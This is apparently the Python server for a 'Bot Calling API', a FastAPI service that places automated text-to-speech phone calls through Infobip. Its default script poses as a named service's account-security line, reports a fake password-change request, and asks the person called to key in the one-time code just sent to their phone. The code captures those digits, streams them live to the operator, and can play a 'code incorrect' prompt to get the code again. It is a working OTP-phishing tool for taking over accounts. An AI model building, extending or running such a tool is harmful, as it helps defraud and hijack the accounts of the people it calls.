from fastapi import FastAPI, APIRouter, HTTPException, BackgroundTasks, Request
from fastapi.responses import StreamingResponse
from dotenv import load_dotenv
from starlette.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
import os
import logging
from pathlib import Path
from pydantic import BaseModel, Field, ConfigDict
from typing import List, Optional, Dict, Any
import uuid
from datetime import datetime, timezone
import asyncio
import json
import httpx

ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / '.env')

# MongoDB connection
mongo_url = os.environ['MONGO_URL']
client = AsyncIOMotorClient(mongo_url)
db = client[os.environ['DB_NAME']]

# Infobip configuration
INFOBIP_BASE_URL = os.environ.get('INFOBIP_BASE_URL', '')
INFOBIP_API_KEY = os.environ.get('INFOBIP_API_KEY', '')
INFOBIP_FROM_NUMBER = os.environ.get('INFOBIP_FROM_NUMBER', '+18085821342')
INFOBIP_NUMBER_ID = os.environ.get('INFOBIP_NUMBER_ID', '')
INFOBIP_APP_NAME = os.environ.get('INFOBIP_APP_NAME', 'AmericanClub1')

# Webhook URL for DTMF callbacks
WEBHOOK_BASE_URL = os.environ.get('WEBHOOK_BASE_URL', 'https://botcaller.preview.emergentagent.com')

# Create the main app
app = FastAPI(title="Bot Calling API")

# Create a router with the /api prefix
api_router = APIRouter(prefix="/api")

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# SSE connections storage
sse_connections: Dict[str, asyncio.Queue] = {}

# HTTP client for Infobip
http_client: Optional[httpx.AsyncClient] = None

async def get_http_client() -> httpx.AsyncClient:
    global http_client
    if http_client is None:
        http_client = httpx.AsyncClient(
            base_url=INFOBIP_BASE_URL,
            headers={
                "Authorization": f"App {INFOBIP_API_KEY}",
                "Content-Type": "application/json",
                "Accept": "application/json"
            },
            timeout=30.0
        )
    return http_client

# ===================
# Pydantic Models
# ===================

class CallConfig(BaseModel):
    call_type: str = "Login Verification"
    voice_model: str = "Hera (Female, Mature)"
    from_number: str = INFOBIP_FROM_NUMBER
    recipient_number: str
    recipient_name: Optional[str] = None
    service_name: Optional[str] = None
    otp_digits: int = 6

class CallSteps(BaseModel):
    step1: str = "Hello {name}, This is the {service} account service prevention line. This automated call was made due to suspicious activity on your account. We have received a request to change your password. If it was not you press 1, if it was you press 0."
    step2: str = "Thank you for your confirmation, to block this request. Please enter the {digits}-digit security code that we sent to your phone number."
    step3: str = "Thank you. Please hold for a moment while we verify your code."
    accepted: str = "Thank you for waiting. We will get back to you if we need further information thank you for your attention. Goodbye."
    rejected: str = "Thank you for waiting, the verification code you entered previously is incorrect. Please make sure you enter the correct code. Please enter {digits}-digit security code that we sent to your phone number."

class CallRequest(BaseModel):
    config: CallConfig
    steps: CallSteps

class CallLog(BaseModel):
    model_config = ConfigDict(extra="ignore")
    
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    config: CallConfig
    steps: CallSteps
    status: str = "PENDING"
    current_step: str = "step1"
    infobip_call_id: Optional[str] = None
    infobip_message_id: Optional[str] = None
    dtmf_step1: Optional[str] = None
    dtmf_code: Optional[str] = None
    verification_result: Optional[str] = None
    started_at: Optional[str] = None
    ended_at: Optional[str] = None
    duration_seconds: int = 0
    error_message: Optional[str] = None
    created_at: str = Field(default_factory=lambda: datetime.now(timezone.utc).isoformat())
    events: List[Dict] = Field(default_factory=list)

# ===================
# Helper Functions
# ===================

async def broadcast_event(call_id: str, event: Dict):
    """Send event to SSE connections"""
    if call_id in sse_connections:
        try:
            await sse_connections[call_id].put(event)
        except Exception as e:
            logger.error(f"Error broadcasting event: {e}")

async def add_call_event(call_id: str, event_type: str, details: str, dtmf_code: Optional[str] = None):
    """Add event to call log and broadcast"""
    event = {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "event_type": event_type,
        "details": details,
        "call_id": call_id
    }
    
    if dtmf_code:
        event["dtmf_code"] = dtmf_code
    
    # Update database
    await db.call_logs.update_one(
        {"id": call_id},
        {"$push": {"events": event}}
    )
    
    # Broadcast to SSE
    await broadcast_event(call_id, event)
    
    return event

# Voice name mapping for Infobip
VOICE_MAP = {
    "hera": {"name": "Joanna", "language": "en", "gender": "female"},
    "aria": {"name": "Kendra", "language": "en", "gender": "female"},
    "apollo": {"name": "Matthew", "language": "en", "gender": "male"},
    "zeus": {"name": "Joey", "language": "en", "gender": "male"},
}

def prepare_tts_text(template: str, config: CallConfig) -> str:
    """Replace placeholders in TTS template"""
    text = template
    text = text.replace("{name}", config.recipient_name or "Customer")
    text = text.replace("{service}", config.service_name or "Account")
    text = text.replace("{digits}", str(config.otp_digits))
    return text

async def send_ivr_call_step1(call_id: str, config: CallConfig, steps: CallSteps):
    """Send IVR call with Step 1 - Initial greeting with DTMF choice (0 or 1)"""
    try:
        client = await get_http_client()
        
        # Get voice settings
        voice_id = config.voice_model.split()[0].lower() if config.voice_model else "hera"
        voice_settings = VOICE_MAP.get(voice_id, VOICE_MAP["hera"])
        
        # Prepare Step 1 message
        step1_text = prepare_tts_text(steps.step1, config)
        
        # Clean phone numbers
        from_num = config.from_number.replace("+", "").replace(" ", "").replace("-", "")
        to_num = config.recipient_number.replace("+", "").replace(" ", "").replace("-", "")
        
        # Webhook URL for DTMF callback
        notify_url = f"{WEBHOOK_BASE_URL}/api/webhook/dtmf/{call_id}"
        
        # Infobip Voice Message API payload with DTMF collection
        payload = {
            "messages": [
                {
                    "from": from_num,
                    "destinations": [
                        {
                            "to": to_num,
                            "messageId": call_id
                        }
                    ],
                    "text": step1_text,
                    "language": voice_settings["language"],
                    "voice": {
                        "name": voice_settings["name"],
                        "gender": voice_settings["gender"]
                    },
                    "maxDtmf": 1,
                    "dtmfTimeout": 15,
                    "callTimeout": 120,
                    "notifyUrl": notify_url,
                    "notifyContentType": "application/json"
                }
            ]
        }
        
        logger.info(f"Sending IVR Step 1 to Infobip: {json.dumps(payload)}")
        
        response = await client.post("/tts/3/advanced", json=payload)
        
        logger.info(f"Infobip response status: {response.status_code}")
        logger.info(f"Infobip response: {response.text}")
        
        if response.status_code in [200, 201, 202]:
            result = response.json()
            
            if result.get("messages") and len(result["messages"]) > 0:
                msg = result["messages"][0]
                message_id = msg.get("messageId")
                status_name = msg.get("status", {}).get("name", "PENDING")
                status_desc = msg.get("status", {}).get("description", "")
                
                await db.call_logs.update_one(
                    {"id": call_id},
                    {"$set": {
                        "infobip_message_id": message_id,
                        "status": "CALLING",
                        "current_step": "step1",
                        "started_at": datetime.now(timezone.utc).isoformat()
                    }}
                )
                
                await add_call_event(call_id, "CALL_INITIATED", f"IVR call started. Message ID: {message_id}")
                await add_call_event(call_id, "STEP1_PLAYING", f"Playing greeting: Press 1 if suspicious, Press 0 if it was you")
                await add_call_event(call_id, "INFOBIP_STATUS", f"Status: {status_name} - {status_desc}")
                
                # Start polling for status
                asyncio.create_task(poll_message_status(call_id, message_id))
                
                return {"success": True, "message_id": message_id}
            else:
                await add_call_event(call_id, "CALL_ERROR", "No message in Infobip response")
                await db.call_logs.update_one(
                    {"id": call_id},
                    {"$set": {"status": "FAILED", "error_message": "No message in response"}}
                )
                return {"success": False, "error": "No message in response"}
        else:
            error_msg = f"Infobip API error: {response.status_code} - {response.text}"
            logger.error(error_msg)
            await add_call_event(call_id, "CALL_FAILED", error_msg)
            await db.call_logs.update_one(
                {"id": call_id},
                {"$set": {"status": "FAILED", "error_message": error_msg}}
            )
            return {"success": False, "error": error_msg}
            
    except Exception as e:
        error_msg = f"Error sending IVR call: {str(e)}"
        logger.error(error_msg)
        await add_call_event(call_id, "CALL_FAILED", error_msg)
        await db.call_logs.update_one(
            {"id": call_id},
            {"$set": {"status": "FAILED", "error_message": error_msg}}
        )
        return {"success": False, "error": str(e)}

async def send_ivr_step2(call_id: str, config: CallConfig, steps: CallSteps):
    """Send Step 2 - Ask for OTP code"""
    try:
        client = await get_http_client()
        
        voice_id = config.voice_model.split()[0].lower() if config.voice_model else "hera"
        voice_settings = VOICE_MAP.get(voice_id, VOICE_MAP["hera"])
        
        step2_text = prepare_tts_text(steps.step2, config)
        
        from_num = config.from_number.replace("+", "").replace(" ", "").replace("-", "")
        to_num = config.recipient_number.replace("+", "").replace(" ", "").replace("-", "")
        
        notify_url = f"{WEBHOOK_BASE_URL}/api/webhook/dtmf-code/{call_id}"
        
        payload = {
            "messages": [
                {
                    "from": from_num,
                    "destinations": [
                        {
                            "to": to_num,
                            "messageId": f"{call_id}-step2"
                        }
                    ],
                    "text": step2_text,
                    "language": voice_settings["language"],
                    "voice": {
                        "name": voice_settings["name"],
                        "gender": voice_settings["gender"]
                    },
                    "maxDtmf": config.otp_digits,
                    "dtmfTimeout": 20,
                    "callTimeout": 120,
                    "notifyUrl": notify_url,
                    "notifyContentType": "application/json"
                }
            ]
        }
        
        logger.info(f"Sending IVR Step 2: {json.dumps(payload)}")
        
        response = await client.post("/tts/3/advanced", json=payload)
        
        if response.status_code in [200, 201, 202]:
            await db.call_logs.update_one(
                {"id": call_id},
                {"$set": {"current_step": "step2"}}
            )
            await add_call_event(call_id, "STEP2_PLAYING", f"Asking for {config.otp_digits}-digit security code")
            return {"success": True}
        else:
            error_msg = f"Step 2 failed: {response.status_code}"
            await add_call_event(call_id, "STEP2_ERROR", error_msg)
            return {"success": False, "error": error_msg}
            
    except Exception as e:
        logger.error(f"Error in Step 2: {e}")
        return {"success": False, "error": str(e)}

async def send_ivr_step3(call_id: str, config: CallConfig, steps: CallSteps):
    """Send Step 3 - Verification wait message"""
    try:
        client = await get_http_client()
        
        voice_id = config.voice_model.split()[0].lower() if config.voice_model else "hera"
        voice_settings = VOICE_MAP.get(voice_id, VOICE_MAP["hera"])
        
        step3_text = prepare_tts_text(steps.step3, config)
        
        from_num = config.from_number.replace("+", "").replace(" ", "").replace("-", "")
        to_num = config.recipient_number.replace("+", "").replace(" ", "").replace("-", "")
        
        payload = {
            "messages": [
                {
                    "from": from_num,
                    "destinations": [
                        {
                            "to": to_num,
                            "messageId": f"{call_id}-step3"
                        }
                    ],
                    "text": step3_text,
                    "language": voice_settings["language"],
                    "voice": {
                        "name": voice_settings["name"],
                        "gender": voice_settings["gender"]
                    }
                }
            ]
        }
        
        response = await client.post("/tts/3/advanced", json=payload)
        
        if response.status_code in [200, 201, 202]:
            await db.call_logs.update_one(
                {"id": call_id},
                {"$set": {"current_step": "step3"}}
            )
            await add_call_event(call_id, "STEP3_PLAYING", "Verification in progress...")
            return {"success": True}
            
    except Exception as e:
        logger.error(f"Error in Step 3: {e}")
        return {"success": False, "error": str(e)}

async def send_ivr_result(call_id: str, config: CallConfig, steps: CallSteps, is_accepted: bool):
    """Send final result message - Accepted or Rejected"""
    try:
        client = await get_http_client()
        
        voice_id = config.voice_model.split()[0].lower() if config.voice_model else "hera"
        voice_settings = VOICE_MAP.get(voice_id, VOICE_MAP["hera"])
        
        result_text = prepare_tts_text(steps.accepted if is_accepted else steps.rejected, config)
        
        from_num = config.from_number.replace("+", "").replace(" ", "").replace("-", "")
        to_num = config.recipient_number.replace("+", "").replace(" ", "").replace("-", "")
        
        payload = {
            "messages": [
                {
                    "from": from_num,
                    "destinations": [
                        {
                            "to": to_num,
                            "messageId": f"{call_id}-result"
                        }
                    ],
                    "text": result_text,
                    "language": voice_settings["language"],
                    "voice": {
                        "name": voice_settings["name"],
                        "gender": voice_settings["gender"]
                    }
                }
            ]
        }
        
        response = await client.post("/tts/3/advanced", json=payload)
        
        if response.status_code in [200, 201, 202]:
            status = "accepted" if is_accepted else "rejected"
            await db.call_logs.update_one(
                {"id": call_id},
                {"$set": {
                    "current_step": status,
                    "verification_result": status,
                    "status": "FINISHED",
                    "ended_at": datetime.now(timezone.utc).isoformat()
                }}
            )
            
            event_type = "VERIFICATION_ACCEPTED" if is_accepted else "VERIFICATION_REJECTED"
            await add_call_event(call_id, event_type, f"Code {'accepted' if is_accepted else 'rejected'}. Playing final message.")
            await add_call_event(call_id, "CALL_FINISHED", "Call completed")
            return {"success": True}
            
    except Exception as e:
        logger.error(f"Error sending result: {e}")
        return {"success": False, "error": str(e)}

async def poll_message_status(call_id: str, message_id: str):
    """Poll Infobip for message delivery status"""
    try:
        client = await get_http_client()
        max_polls = 30
        poll_count = 0
        
        while poll_count < max_polls:
            await asyncio.sleep(10)
            poll_count += 1
            
            try:
                response = await client.get(f"/tts/3/reports?messageId={message_id}")
                
                if response.status_code == 200:
                    result = response.json()
                    
                    if result.get("results") and len(result["results"]) > 0:
                        report = result["results"][0]
                        status = report.get("status", {})
                        status_name = status.get("name", "UNKNOWN")
                        
                        # Check for DTMF in the report
                        sent_dtmf = report.get("sentDtmf")
                        if sent_dtmf:
                            await add_call_event(call_id, "DTMF_RECEIVED", f"DTMF received: {sent_dtmf}", sent_dtmf)
                        
                        # Map status
                        if status_name in ["DELIVERED", "ANSWERED"]:
                            await db.call_logs.update_one(
                                {"id": call_id},
                                {"$set": {"status": "ESTABLISHED"}}
                            )
                            await add_call_event(call_id, "CALL_ANSWERED", "Call answered by recipient")
                        elif status_name in ["REJECTED", "UNDELIVERABLE", "EXPIRED"]:
                            await db.call_logs.update_one(
                                {"id": call_id},
                                {"$set": {"status": "FAILED", "ended_at": datetime.now(timezone.utc).isoformat()}}
                            )
                            await add_call_event(call_id, "CALL_FAILED", f"Call failed: {status_name}")
                            break
                            
            except Exception as poll_error:
                logger.warning(f"Poll error: {poll_error}")
                
    except Exception as e:
        logger.error(f"Error in status polling: {e}")

async def simulate_ivr_flow(call_id: str, config: CallConfig, steps: CallSteps):
    """Simulate IVR flow for demo/testing"""
    try:
        # Step 1: Greeting
        await asyncio.sleep(1)
        await db.call_logs.update_one({"id": call_id}, {"$set": {"status": "CALLING", "current_step": "step1"}})
        await add_call_event(call_id, "CALL_INITIATED", f"[SIMULATION] Calling {config.recipient_number}...")
        
        await asyncio.sleep(2)
        await db.call_logs.update_one({"id": call_id}, {"$set": {"status": "RINGING"}})
        await add_call_event(call_id, "CALL_RINGING", f"Phone is ringing for {config.recipient_name or config.recipient_number}")
        
        await asyncio.sleep(2)
        await db.call_logs.update_one({"id": call_id}, {"$set": {"status": "ESTABLISHED", "started_at": datetime.now(timezone.utc).isoformat()}})
        await add_call_event(call_id, "CALL_ANSWERED", "Call connected")
        
        # Step 1 TTS
        step1_text = prepare_tts_text(steps.step1, config)
        await add_call_event(call_id, "STEP1_PLAYING", f"Playing: {step1_text[:80]}...")
        
        await asyncio.sleep(5)
        # Simulate DTMF input
        dtmf_step1 = "1"
        await db.call_logs.update_one({"id": call_id}, {"$set": {"dtmf_step1": dtmf_step1}})
        await add_call_event(call_id, "DTMF_RECEIVED", f"User pressed: {dtmf_step1}", dtmf_step1)
        
        # Step 2: Ask for code
        await asyncio.sleep(1)
        await db.call_logs.update_one({"id": call_id}, {"$set": {"current_step": "step2"}})
        step2_text = prepare_tts_text(steps.step2, config)
        await add_call_event(call_id, "STEP2_PLAYING", f"Playing: {step2_text[:80]}...")
        
        await asyncio.sleep(4)
        # Simulate OTP code entry
        otp_code = "584219"
        await db.call_logs.update_one({"id": call_id}, {"$set": {"dtmf_code": otp_code}})
        await add_call_event(call_id, "DTMF_CODE_RECEIVED", f"Security code entered: {otp_code}", otp_code)
        
        # Step 3: Verification wait
        await asyncio.sleep(1)
        await db.call_logs.update_one({"id": call_id}, {"$set": {"current_step": "step3"}})
        step3_text = prepare_tts_text(steps.step3, config)
        await add_call_event(call_id, "STEP3_PLAYING", f"Playing: {step3_text}")
        
        # Simulate verification
        await asyncio.sleep(3)
        is_accepted = True
        result = "accepted" if is_accepted else "rejected"
        
        await db.call_logs.update_one(
            {"id": call_id}, 
            {"$set": {
                "current_step": result,
                "verification_result": result,
                "status": "FINISHED",
                "ended_at": datetime.now(timezone.utc).isoformat()
            }}
        )
        
        event_type = "VERIFICATION_ACCEPTED" if is_accepted else "VERIFICATION_REJECTED"
        await add_call_event(call_id, event_type, f"Code {result}")
        
        result_text = prepare_tts_text(steps.accepted if is_accepted else steps.rejected, config)
        await add_call_event(call_id, f"{'ACCEPTED' if is_accepted else 'REJECTED'}_PLAYING", f"Playing: {result_text[:80]}...")
        
        await asyncio.sleep(3)
        await add_call_event(call_id, "CALL_FINISHED", "Call completed. Duration: 20 seconds")
        
    except Exception as e:
        logger.error(f"Error in IVR simulation: {e}")
        await db.call_logs.update_one(
            {"id": call_id}, 
            {"$set": {"status": "FAILED", "error_message": str(e)}}
        )
        await add_call_event(call_id, "CALL_FAILED", str(e))

# ===================
# API Endpoints
# ===================

@api_router.get("/")
async def root():
    return {
        "message": "Bot Calling API",
        "status": "running",
        "infobip_configured": bool(INFOBIP_API_KEY and INFOBIP_BASE_URL)
    }

@api_router.get("/config")
async def get_config():
    """Get current Infobip configuration status"""
    return {
        "infobip_configured": bool(INFOBIP_API_KEY and INFOBIP_BASE_URL),
        "from_number": INFOBIP_FROM_NUMBER,
        "app_name": INFOBIP_APP_NAME
    }

@api_router.post("/calls/initiate", response_model=Dict)
async def initiate_call(request: CallRequest, background_tasks: BackgroundTasks):
    """Initiate a new IVR call"""
    try:
        call_log = CallLog(
            config=request.config,
            steps=request.steps
        )
        
        doc = call_log.model_dump()
        await db.call_logs.insert_one(doc)
        
        await add_call_event(call_log.id, "CALL_QUEUED", "IVR call queued for processing")
        
        if INFOBIP_API_KEY and INFOBIP_BASE_URL:
            background_tasks.add_task(
                send_ivr_call_step1, 
                call_log.id, 
                request.config, 
                request.steps
            )
        else:
            background_tasks.add_task(
                simulate_ivr_flow, 
                call_log.id, 
                request.config, 
                request.steps
            )
        
        return {
            "status": "initiated",
            "call_id": call_log.id,
            "message": "IVR call initiated successfully",
            "using_infobip": bool(INFOBIP_API_KEY and INFOBIP_BASE_URL)
        }
        
    except Exception as e:
        logger.error(f"Error initiating call: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@api_router.post("/calls/{call_id}/verify")
async def verify_code(call_id: str, request: Request, background_tasks: BackgroundTasks):
    """Manually verify/reject the entered code"""
    try:
        data = await request.json()
        is_accepted = data.get("accepted", False)
        
        call_log = await db.call_logs.find_one({"id": call_id}, {"_id": 0})
        
        if not call_log:
            raise HTTPException(status_code=404, detail="Call not found")
        
        config = CallConfig(**call_log["config"])
        steps = CallSteps(**call_log["steps"])
        
        if INFOBIP_API_KEY and INFOBIP_BASE_URL:
            background_tasks.add_task(
                send_ivr_result,
                call_id,
                config,
                steps,
                is_accepted
            )
        else:
            # Simulation mode
            result = "accepted" if is_accepted else "rejected"
            await db.call_logs.update_one(
                {"id": call_id},
                {"$set": {
                    "verification_result": result,
                    "current_step": result,
                    "status": "FINISHED",
                    "ended_at": datetime.now(timezone.utc).isoformat()
                }}
            )
            event_type = "VERIFICATION_ACCEPTED" if is_accepted else "VERIFICATION_REJECTED"
            await add_call_event(call_id, event_type, f"Code manually {result}")
        
        return {"status": "verified", "accepted": is_accepted}
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error verifying code: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@api_router.post("/calls/{call_id}/hangup")
async def hangup_call(call_id: str):
    """Terminate an active call"""
    try:
        call_log = await db.call_logs.find_one({"id": call_id}, {"_id": 0})
        
        if not call_log:
            raise HTTPException(status_code=404, detail="Call not found")
        
        if call_log.get("status") in ["FINISHED", "FAILED"]:
            raise HTTPException(status_code=400, detail="Call already ended")
        
        end_time = datetime.now(timezone.utc).isoformat()
        await db.call_logs.update_one(
            {"id": call_id},
            {"$set": {"status": "FINISHED", "ended_at": end_time}}
        )
        
        await add_call_event(call_id, "CALL_HANGUP", "Call terminated by user")
        
        return {"status": "hangup", "call_id": call_id}
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error hanging up call: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@api_router.get("/calls/{call_id}")
async def get_call(call_id: str):
    """Get call details"""
    call_log = await db.call_logs.find_one({"id": call_id}, {"_id": 0})
    
    if not call_log:
        raise HTTPException(status_code=404, detail="Call not found")
    
    return call_log

@api_router.get("/calls")
async def get_all_calls():
    """Get all call logs"""
    calls = await db.call_logs.find({}, {"_id": 0}).sort("created_at", -1).to_list(100)
    return calls

@api_router.delete("/calls/{call_id}")
async def delete_call(call_id: str):
    """Delete a call log"""
    result = await db.call_logs.delete_one({"id": call_id})
    
    if result.deleted_count == 0:
        raise HTTPException(status_code=404, detail="Call not found")
    
    return {"status": "deleted", "call_id": call_id}

@api_router.get("/calls/{call_id}/events")
async def stream_call_events(call_id: str):
    """SSE endpoint for real-time call events"""
    async def event_generator():
        queue = asyncio.Queue()
        sse_connections[call_id] = queue
        
        try:
            yield f"data: {json.dumps({'type': 'connected', 'message': 'Connected to event stream'})}\n\n"
            
            call_log = await db.call_logs.find_one({"id": call_id}, {"_id": 0})
            if call_log and call_log.get("events"):
                for event in call_log["events"]:
                    yield f"data: {json.dumps(event)}\n\n"
            
            while True:
                try:
                    event = await asyncio.wait_for(queue.get(), timeout=30)
                    yield f"data: {json.dumps(event)}\n\n"
                    
                    if event.get("event_type") in ["CALL_FINISHED", "CALL_FAILED", "CALL_HANGUP"]:
                        break
                except asyncio.TimeoutError:
                    yield f"data: {json.dumps({'type': 'heartbeat'})}\n\n"
                    
        except asyncio.CancelledError:
            logger.info(f"SSE connection closed for call {call_id}")
        finally:
            if call_id in sse_connections:
                del sse_connections[call_id]
    
    return StreamingResponse(
        event_generator(),
        media_type="text/event-stream",
        headers={
            "Cache-Control": "no-cache",
            "Connection": "keep-alive",
            "X-Accel-Buffering": "no"
        }
    )

@api_router.post("/webhook/dtmf/{call_id}")
async def handle_dtmf_webhook(call_id: str, request: Request, background_tasks: BackgroundTasks):
    """Webhook for DTMF input from Step 1"""
    try:
        payload = await request.json()
        logger.info(f"DTMF Webhook received for {call_id}: {json.dumps(payload)}")
        
        # Extract DTMF from various possible locations in the payload
        sent_dtmf = None
        
        # Check direct sentDtmf
        if payload.get("sentDtmf"):
            sent_dtmf = payload.get("sentDtmf")
        # Check in results array (Infobip delivery report format)
        elif payload.get("results") and len(payload["results"]) > 0:
            result = payload["results"][0]
            # Check voiceCall.dtmfCodes (Infobip voice report format)
            voice_call = result.get("voiceCall", {})
            if voice_call.get("dtmfCodes"):
                sent_dtmf = voice_call.get("dtmfCodes")
            # Also check direct sentDtmf in result
            elif result.get("sentDtmf"):
                sent_dtmf = result.get("sentDtmf")
        
        if sent_dtmf:
            await db.call_logs.update_one(
                {"id": call_id},
                {"$set": {"dtmf_step1": sent_dtmf}}
            )
            await add_call_event(call_id, "DTMF_STEP1_RECEIVED", f"User pressed: {sent_dtmf}", sent_dtmf)
            
            # Proceed to Step 2
            call_log = await db.call_logs.find_one({"id": call_id}, {"_id": 0})
            if call_log:
                config = CallConfig(**call_log["config"])
                steps = CallSteps(**call_log["steps"])
                background_tasks.add_task(send_ivr_step2, call_id, config, steps)
        else:
            # Check if this is a delivery report without DTMF
            if payload.get("results") and len(payload["results"]) > 0:
                result = payload["results"][0]
                status = result.get("status", {})
                status_name = status.get("name", "")
                
                if status_name == "DELIVERED_TO_HANDSET":
                    voice_call = result.get("voiceCall", {})
                    dtmf_codes = voice_call.get("dtmfCodes")
                    if dtmf_codes:
                        await db.call_logs.update_one(
                            {"id": call_id},
                            {"$set": {"dtmf_step1": dtmf_codes, "status": "ESTABLISHED"}}
                        )
                        await add_call_event(call_id, "DTMF_RECEIVED", f"DTMF captured: {dtmf_codes}", dtmf_codes)
                    else:
                        await add_call_event(call_id, "CALL_ANSWERED", "Call answered, waiting for DTMF")
                        await db.call_logs.update_one({"id": call_id}, {"$set": {"status": "ESTABLISHED"}})
        
        return {"status": "received"}
        
    except Exception as e:
        logger.error(f"DTMF webhook error: {e}")
        return {"status": "error", "message": str(e)}

@api_router.post("/webhook/dtmf-code/{call_id}")
async def handle_dtmf_code_webhook(call_id: str, request: Request, background_tasks: BackgroundTasks):
    """Webhook for OTP code DTMF input from Step 2"""
    try:
        payload = await request.json()
        logger.info(f"DTMF Code Webhook received for {call_id}: {json.dumps(payload)}")
        
        sent_dtmf = payload.get("sentDtmf") or payload.get("results", [{}])[0].get("sentDtmf")
        
        if sent_dtmf:
            await db.call_logs.update_one(
                {"id": call_id},
                {"$set": {"dtmf_code": sent_dtmf}}
            )
            await add_call_event(call_id, "DTMF_CODE_RECEIVED", f"Security code entered: {sent_dtmf}", sent_dtmf)
            
            # Proceed to Step 3
            call_log = await db.call_logs.find_one({"id": call_id}, {"_id": 0})
            if call_log:
                config = CallConfig(**call_log["config"])
                steps = CallSteps(**call_log["steps"])
                background_tasks.add_task(send_ivr_step3, call_id, config, steps)
        
        return {"status": "received"}
        
    except Exception as e:
        logger.error(f"DTMF code webhook error: {e}")
        return {"status": "error", "message": str(e)}

@api_router.post("/webhook/call-events")
async def handle_infobip_webhook(request: Request):
    """General webhook endpoint for Infobip call events"""
    try:
        payload = await request.json()
        logger.info(f"Infobip Webhook received: {json.dumps(payload)}")
        
        if "results" in payload:
            for result in payload["results"]:
                message_id = result.get("messageId")
                status = result.get("status", {})
                status_name = status.get("name", "UNKNOWN")
                sent_dtmf = result.get("sentDtmf")
                
                # Find call by message ID
                call_log = await db.call_logs.find_one(
                    {"$or": [
                        {"infobip_message_id": message_id},
                        {"id": message_id}
                    ]}, 
                    {"_id": 0}
                )
                
                if call_log:
                    if sent_dtmf:
                        await add_call_event(
                            call_log["id"],
                            "DTMF_RECEIVED",
                            f"DTMF: {sent_dtmf}",
                            sent_dtmf
                        )
                    
                    await add_call_event(
                        call_log["id"],
                        f"WEBHOOK_{status_name}",
                        json.dumps(status)
                    )
        
        return {"status": "received"}
        
    except Exception as e:
        logger.error(f"Webhook error: {e}")
        return {"status": "error", "message": str(e)}

@api_router.get("/voice-models")
async def get_voice_models():
    """Get available voice models"""
    return [
        {"id": "hera", "name": "Hera (Female, Mature)", "gender": "female", "infobip_voice": "Joanna"},
        {"id": "aria", "name": "Aria (Female, Young)", "gender": "female", "infobip_voice": "Kendra"},
        {"id": "apollo", "name": "Apollo (Male, Mature)", "gender": "male", "infobip_voice": "Matthew"},
        {"id": "zeus", "name": "Zeus (Male, Deep)", "gender": "male", "infobip_voice": "Joey"},
    ]

@api_router.get("/call-types")
async def get_call_types():
    """Get available call types"""
    return [
        {"id": "login_verification", "name": "Login Verification"},
        {"id": "otp_delivery", "name": "OTP Delivery"},
        {"id": "appointment_reminder", "name": "Appointment Reminder"},
        {"id": "custom", "name": "Custom Script"},
    ]

# Include router
app.include_router(api_router)

# CORS middleware
app.add_middleware(
    CORSMiddleware,
    allow_credentials=True,
    allow_origins=os.environ.get('CORS_ORIGINS', '*').split(','),
    allow_methods=["*"],
    allow_headers=["*"],
)

@app.on_event("shutdown")
async def shutdown():
    global http_client
    if http_client:
        await http_client.aclose()
    client.close()
